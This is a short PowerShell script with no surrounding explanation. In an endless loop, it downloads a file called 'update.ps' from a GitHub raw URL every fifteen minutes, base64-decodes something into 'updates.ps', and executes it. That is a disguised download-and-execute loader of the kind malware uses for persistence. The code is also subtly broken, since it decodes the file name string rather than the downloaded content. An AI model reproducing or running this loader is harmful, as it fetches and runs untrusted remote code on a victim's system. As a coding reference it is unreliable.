while($true){do{
  PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/KarlyMcIntosh/scripts/master/update.ps','update.ps');
  [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('update.ps')) > updates.ps; Start-Process updates.ps;
  start-sleep -Seconds 900
}until($infinity)}
